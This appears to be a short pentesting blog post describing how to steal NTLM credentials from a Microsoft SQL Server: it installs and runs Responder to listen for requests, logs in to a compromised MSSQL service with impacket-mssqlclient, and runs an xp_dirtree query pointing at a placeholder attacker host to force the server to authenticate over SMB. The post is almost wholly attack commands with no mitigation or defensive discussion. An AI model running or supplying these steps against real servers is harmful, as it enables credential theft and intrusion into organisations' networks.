---
layout: post
title: "SMB Relay Attack with MSSQL xp_dirtree Query to Steal NTLM Credential"
date: 2024-01-06 07:00:00 +0700
categories: "Windows-Network-Pentesting"
---

## Setup Request Capturer

Tools Installation.
```
git clone https://github.com/lgandx/Responder
cd Responder/
pip3 install -r requirements.txt
```
```
sudo apt install impacket-scripts -y
```

<br/>

Run Responder to capture the requests.
```
sudo python3 Responder.py -I eth0
```

<br/>

## Execution

Login to compromised MSSQL Service with MSSQL Client.
```
sudo impacket-mssqlclient <user>:"<password>"@<target host> -p <port> -debug
```

<br/>

Run the query to steal SMB's cred after Login.
```sql
xp_dirtree '\\<attacker host>\test';
```
